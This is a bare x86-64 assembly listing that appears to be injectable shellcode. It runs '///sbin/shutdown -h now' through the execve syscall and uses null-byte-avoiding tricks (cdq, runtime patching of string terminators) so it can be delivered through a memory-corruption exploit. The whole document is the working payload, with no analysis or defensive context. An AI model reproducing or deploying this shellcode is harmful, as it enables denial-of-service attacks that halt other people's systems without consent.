global _start

section .text

_start:

        jmp real_start

        command: db "///sbin/shutdown "
        arg1   : db "-h "
        arg2   : db "now "

real_start:

        push 59                         ; Syscall Number moved here
        pop rax

        cdq                             ; RDX <- 0x00 as RAX >= 0
        push rdx                        ; NULL

        lea rbx, [rel arg2]             ; Rel Addr
        mov [rbx + 3], byte dl
        push rbx			; Push @

        sub bl, 3			; Rel Addr
        push rbx
        pop rcx
        mov [rcx + 2], byte dl
        push rcx			; Push @

        ;lea rdi, [rel command]         ; Rel Addr
        sub bl, 17
        push rbx
        pop rdi
        mov [rdi+16], byte dl
        push rdi			; Push @

        push rsp			; Push @ of @
        pop rsi

        syscall